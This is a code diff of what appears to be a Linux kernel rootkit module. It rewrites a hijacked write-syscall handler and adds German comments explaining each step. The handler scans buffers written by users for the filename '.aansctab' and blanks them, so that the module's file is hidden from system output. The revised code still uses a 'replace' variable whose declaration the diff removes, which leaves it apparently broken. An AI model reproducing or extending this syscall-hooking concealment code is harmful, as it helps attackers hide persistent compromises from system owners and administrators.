@@ -53,37 +53,50 @@ psize **find(void) {
 }
 
 asmlinkage ssize_t aansctab_write(int fd, const char __user *buff, ssize_t count) {
-  int r;
-  int i;
-  char *replace = "infected";
-  size_t len = strlen(replace);
-  char *proc_protect = ".aansctab";
-  char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
-  copy_from_user(kbuff,buff,255);
-  if (strstr(kbuff,proc_protect)) {
-    printk("aansctab: this is the content of kbuff \n%s\n", kbuff);
-    strncpy(kbuff, replace, len);
+        int r;
+        int i;
+        size_t len = strlen(replace);
 
-    for (i=0; i<255; i++)
-    {
-      kbuff[i] = '\0';
-    }
+        /* Dateiname, den wir verstecken wollen */
+        char *proc_protect = ".aansctab";
 
-    mm_segment_t old_fs;
+        /* Speicher im Kernel reservieren */
+        char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
 
-    old_fs = get_fs();
+        /* Puffer vom Benutzer in den Kernel laden */
+        copy_from_user(kbuff,buff,255);
 
-    set_fs(KERNEL_DS);
-    copy_to_user(buff, kbuff, 255);
-    set_fs(old_fs);
+        /* Puffer nach unserem Dateinamen durchsuchen */
 
-    r = (*o_write)(fd,buff,count);
-    kfree(kbuff);
-    return r;
-  }
-  r = (*o_write)(fd,buff,count);
-  kfree(kbuff);
-  return r;
+        if (strstr(kbuff,proc_protect)) { /* Dateiname wurde gefunden */
+
+                /* An alle Stellen im Puffer ein '\0' kopieren */
+                for (i=0; i<255; i++)
+                {
+                        kbuff[i] = '\0';
+                }
+
+                /* Puffer zurück zum Benutzer kopieren */
+                mm_segment_t old_fs;
+
+                old_fs = get_fs();
+
+                set_fs(KERNEL_DS);
+                copy_to_user(buff, kbuff, 255);
+                set_fs(old_fs);
+
+                r = (*o_write)(fd,buff,count);
+
+                kfree(kbuff);
+                return r;
+        }
+        else { /* Der Dateiname wurde nicht gefunden */
+                /* Nichts wird verändert */
+                r = (*o_write)(fd,buff,count);
+
+                kfree(kbuff);
+                return r;
+        }
 }
 
 int aansctab_init(void) {
